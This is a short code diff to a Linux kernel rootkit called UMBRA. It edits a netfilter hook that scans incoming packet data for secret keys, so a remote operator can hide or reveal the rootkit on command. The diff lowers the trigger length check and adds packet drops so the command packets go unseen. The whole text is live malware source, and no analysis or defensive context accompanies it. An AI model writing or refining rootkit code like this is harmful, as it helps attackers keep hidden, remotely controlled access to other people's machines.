@@ -77,7 +77,7 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
         printk(KERN_DEBUG "data len : %d\ndata : \n", (int)strlen(user_data));
         printk(KERN_DEBUG "%s\n", user_data);
 
-        if(strlen(user_data)<31){
+        if(strlen(user_data)<10){
             return NF_ACCEPT;
         }
         
@@ -101,12 +101,14 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
 
             printk(KERN_INFO "UMBRA:: Received order to hide the rootkit \n");
             hide_rootkit();
+            return NF_DROP;
 
         }else if(memcmp(user_data, UMBRA_SHOW_ROOTKIT_KEY, strlen(UMBRA_SHOW_ROOTKIT_KEY))==0){
             /****SHOW ROOTKIT KEY - Show the rootkit, remotely***/
 
             printk(KERN_INFO "UMBRA:: Received order to unhide the rookit \n");
             show_rootkit();
+            return NF_DROP;
         }
 
 
